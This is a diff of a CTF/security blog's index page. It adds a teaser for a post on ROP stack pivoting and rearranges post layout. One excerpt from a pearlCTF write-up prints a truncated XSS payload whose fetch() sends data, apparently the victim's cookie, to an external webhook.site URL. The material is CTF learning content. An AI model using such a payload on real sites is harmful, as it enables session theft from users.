@@ -198,7 +198,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">76</div>
+    <div class="sidebar-state-number">77</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -266,10 +266,56 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/05/17/ROP-EZROP/" aria-label="ROP-EZROP(b33f adv_pwn)"></a>
+      <a class="post-link" href="/2024/05/21/Stack-Migration/" aria-label="Stack-Migration"></a>
     
     
     <div class="post-cover-left">
+      
+        
+        
+          <img data-src="https://i.postimg.cc/bJwcgqPx/131939316-p0.jpg" data-sizes="auto" alt="Stack-Migration" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2024-05-21</span>
+        <span><span class="icon-pencil"></span>805 words</span>
+        <span><span class="icon-clock"></span>3 mins</span>
+      </div>
+      <h2 class="post-title">Stack-Migration</h2>
+      <article class="post-article">
+        
+          Stack migration(pivoting)
+Author: 堇姬Naup
+
+概念
+可輸入的 ROPchain 長度不夠時，可以擴展輸入的方法，將 ROPchain 分好幾次寫在指定的區域，最後再將 stack 移動過去執行
+如果找到其他地方有足夠空間放ROP，就可以用較少的gadget數，來將stack搬移至ROP位置，進行ROP
+
+leave實際上做了兩件事
+12mov rsp, rbppop rbp
+
+方法leave;ret
+透過overflow將rbp填成ROP Chain開始位置address-8
+return address填入leave;ret 的gadget
+
+
+
+有一塊
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2024/05/17/ROP-EZROP/" aria-label="ROP-EZROP(b33f adv_pwn)"></a>
+    
+    
+    <div class="post-cover-right">
       
         
         
@@ -307,12 +353,12 @@ source coderead的buffer overflow一樣給好給滿
 </div>
   
     <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
+  <div class="post-wrap-left" data-aos="fade-up">
     
       <a class="post-link" href="/2024/05/05/THJCC-office-Writeup/" aria-label="THJCC-official-Writeup"></a>
     
     
-    <div class="post-cover-right">
+    <div class="post-cover-left">
       
         
         
@@ -341,12 +387,12 @@ CryptoJPG^PNG&amp;#x3D;?source1234567891011121314from itertools import cycledef 
 </div>
   
     <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
+  <div class="post-wrap-right" data-aos="fade-up">
     
       <a class="post-link" href="/2024/04/27/Intigriti-August-XSS-challenge/" aria-label="Intigriti-August-XSS-challenge"></a>
     
     
-    <div class="post-cover-left">
+    <div class="post-cover-right">
       
         
         
@@ -375,12 +421,12 @@ Source code123456789101112131415161718192021222324252627282930313233343536373839
 </div>
   
     <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
+  <div class="post-wrap-left" data-aos="fade-up">
     
       <a class="post-link" href="/2024/04/25/Assembly-x86/" aria-label="Assembly-x86"></a>
     
     
-    <div class="post-cover-right">
+    <div class="post-cover-left">
       
         
         
@@ -467,12 +513,12 @@ base poi
 </div>
   
     <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
+  <div class="post-wrap-right" data-aos="fade-up">
     
       <a class="post-link" href="/2024/04/25/ROP-chall-1/" aria-label="ROP-chall-1"></a>
     
     
-    <div class="post-cover-left">
+    <div class="post-cover-right">
       
         
         
@@ -526,12 +572,12 @@ rdx
 </div>
   
     <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
+  <div class="post-wrap-left" data-aos="fade-up">
     
       <a class="post-link" href="/2024/03/31/MATH-Lucas-Sequence/" aria-label="Lucas-Sequence"></a>
     
     
-    <div class="post-cover-right">
+    <div class="post-cover-left">
       
         
         
@@ -560,12 +606,12 @@ Author:堇姬
 </div>
   
     <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
+  <div class="post-wrap-right" data-aos="fade-up">
     
       <a class="post-link" href="/2024/03/30/VishwaCTF-2024-WP/" aria-label="VishwaCTF-2024-Writeup"></a>
     
     
-    <div class="post-cover-left">
+    <div class="post-cover-right">
       
         
         
@@ -594,12 +640,12 @@ WebSave The City1234567DESCRIPTIONThe RAW Has Got An Input That ISIS Has Planted
 </div>
   
     <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
+  <div class="post-wrap-left" data-aos="fade-up">
     
       <a class="post-link" href="/2024/03/10/AIS3-EOF-2024-Final/" aria-label="AIS3-EOF-2024-Final"></a>
     
     
-    <div class="post-cover-right">
+    <div class="post-cover-left">
       
         
         
@@ -637,12 +683,12 @@ rush-p0pp3r
 </div>
   
     <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
+  <div class="post-wrap-right" data-aos="fade-up">
     
       <a class="post-link" href="/2024/03/10/pearlCTF-2024-WP/" aria-label="pearlCTF-2024-WP"></a>
     
     
-    <div class="post-cover-left">
+    <div class="post-cover-right">
       
         
         
@@ -665,40 +711,6 @@ Team : CakeisTheFakeRank : 16&amp;#x2F;605
 
 Weblearn HTTP題目是一個web service，會把使用者丟進去的get參數在後端處理後變封包丟出來：然後有個/flag的路徑會去驗證你的cookie，是的話才可以拿到flag。標準的XSS：payload 
 123HTTP/1.1 200 OK&amp;lt;script&amp;gt;fetch(&amp;quot;http://webhook.site/c9e321c1-b9d5-4b55-9d10-f1feec26a1d0?shark=&amp;
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2024/02/29/QuantumCTF-CLASS/" aria-label="量子密碼學(QuantumCTF初探與解題)"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="https://i.postimg.cc/bJwcgqPx/131939316-p0.jpg" data-sizes="auto" alt="量子密碼學(QuantumCTF初探與解題)" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-02-29</span>
-        <span><span class="icon-pencil"></span>5.9k words</span>
-        <span><span class="icon-clock"></span>36 mins</span>
-      </div>
-      <h2 class="post-title">量子密碼學(QuantumCTF初探與解題)</h2>
-      <article class="post-article">
-        
-          
-Author:堇姬Naup
-
-共筆https://hackmd.io/@3C-Tim/HJLfSR_t6/edit
-題目writeup(註解打得很詳細了，我就不多說了)AIS3前測12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import randomfrom math import sqrt#將binary string轉成十進制的functiondef BinaryToDecimal(b
         
       </article>
     </div>
@@ -738,10 +750,10 @@ Author:堇姬Naup
     
       <div>
         <span class="icon-brush"></span>
-        189.2k
+        190.5k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        16:34
+        16:40
       </div>
     
     
@@ -777,7 +789,7 @@ Author:堇姬Naup
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">76</div>
+    <div class="sidebar-state-number">77</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
